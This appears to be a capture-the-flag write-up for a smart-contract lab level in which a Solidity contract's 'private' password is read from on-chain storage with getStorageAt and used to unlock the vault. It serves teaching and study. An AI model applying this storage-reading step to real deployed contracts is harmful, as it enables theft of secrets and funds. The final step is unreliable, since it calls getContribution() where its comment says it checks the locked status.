# **Level 08 — Vault**

## 🎯 Goal  
Unlock the vault by bypassing the password protection.

## 💥 Vulnerability  
In Solidity, **declaring a variable as private only restricts contract-level access — not external visibility**.
**All contract storage is publicly accessible on the blockchain**.
Thus, even private variables (like password) can be read using tools like Etherscan, web3 or getStorageAt allowing an attacker to retrieve the password and unlock the vault.

The string of the vulnerable code:
```solidity 
bytes32 private password;
```

## 🛠 ️Solution (via browser console)
The following steps were executed:
```js
// JS console input 
// 0. Check the locked status - true  
(await contract.locked()).toString() 

// 1. Get private variable password - "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
await web3.eth.getStorageAt(instance_address, 1)

// 2. Call unlock fuction 
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

// 3. Recheck the locked status - false
(await contract.getContribution()).toString()
```

## 🧙 Outcome
By reading the private variable directly from storage, the vault was unlocked and the level completed.
